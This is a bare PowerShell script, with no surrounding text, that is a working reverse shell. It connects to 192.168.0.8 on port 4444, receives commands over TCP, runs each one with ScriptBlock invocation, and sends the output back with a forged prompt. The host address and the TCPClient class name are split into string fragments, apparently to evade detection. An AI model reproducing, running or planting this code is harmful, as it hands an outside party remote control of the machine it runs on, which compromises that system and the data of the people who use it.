$h='192'+'.168'+'.0'+'.8';$p=4444;
$n='Net';$s='Sockets';$t='TCP'+'Client';
$u="$n.$s.$t";$c=New-Object ($u) ($h,$p);
$g=$c.GetStream();
$b=0..65535|%{0};$e=[Text.Encoding]::ASCII;
while(($i=$g.Read($b,0,$b.Length)) -ne 0){
$d=$e.GetString($b,0,$i);
$r=([ScriptBlock]::Create($d)).Invoke();
$t=$r+'PS '+(pwd).Path+'> ';
$x=$e.GetBytes($t);
$g.Write($x,0,$x.Length)
};$c.Close()
